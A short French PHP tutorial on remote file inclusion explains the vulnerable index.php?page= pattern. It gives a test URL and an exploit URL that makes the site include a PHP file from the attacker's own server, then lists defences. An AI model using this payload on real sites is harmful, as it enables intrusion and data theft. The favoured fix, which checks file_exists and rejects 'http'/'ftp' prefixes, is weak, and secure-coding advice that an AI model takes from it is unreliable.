<center><font size=5>FAILLE INCLUDE</font></center><br>

<blockquote>
	En php, pour accéder à une page ou a une autre, il y a 2 solutions :<br>
	<ul>
		<li>Soit donner donner le nom de la page dans l'URL<br><font color="blue">http://www.monserveur.com/page.php</font></li><br>
		<li>Soit donner la page en paramétre, dans l'URL par exemple<br><font color="blue">http://www.monserveur.com/index.php?page=ma_page.php</font></li>
	</ul>
</blockquote>

C'est cette deuxieme facon qui nous interresse. En effet, la page est devenue une variable qui va être utilisée pour accéder à cette page. 
Regardons le code :<br><br>
<?php
	show_source("tuto/faille_include_include.php");
?><br><br>

Bien, maintenant, qu'est-ce qu'il se passerait si on donnait la valeur ' http://www.google.fr/ ' à la variable page dans l'URL.<br>
Nous aurions : <font color="blue">http://www.monserveur.com/index.php?page=</font><font color="red">http://www.google.fr/</font><br><br>

A ce moment précis, nous testons la présence de la faille include. En effet, si vous rentrez cette URL et que le site inclue la page Google.fr dans le site, vous savez que vous pouvez profiter de cette faille...<br><br>

<u>Comment exploiter la faille include ?</u><br>
<blockquote>
Au lieu de rentrer <font color="red">http://www.google.fr/</font> dans l'URL,<br>
si vous rentrez <font color="red">http://www.monautreserveur.com/mon_fichier.php</font>
</blockquote>

le site va inclure votre page a sont site, vous pouvez alors faire ce que vous voulez sur le site :<br>
importer des fichiers sur le serveur, voir les fichiers du site, accéder à la Base de Données, etc.<br><br>

<u>Comment s'en protéger ?</u><br>
<blockquote>
Vous avez plusieurs solutions pour vous protéger de cette faille :
	<ul style="list-style-type:lower-greek ;">
		<li><b>( fastidieuse )</b> avoir un tableau des pages valides : avant d'inclure la page, on verifie que la page est contenue dans le tableau des pages valides.</li><br>
		<li><b>( encore plus fastidieuse )</b> faire un GROS SWITCH : pour inclure la page, vous faites un switch sur la varable page et tester les cas d'inclusions...</li><br>
		<li><b>( trés bien )</b> c'est celle que j'utilise : tester l'existance de la page avec la fonction file_exists, puis tester si les 4 premieres lettres ne sont pas ' http ', de même pour ' ftp '</li>
	</ul>
</blockquote>

<center>La faille include est la pire des failles, il faut vraiment y préter attention !</center><br>

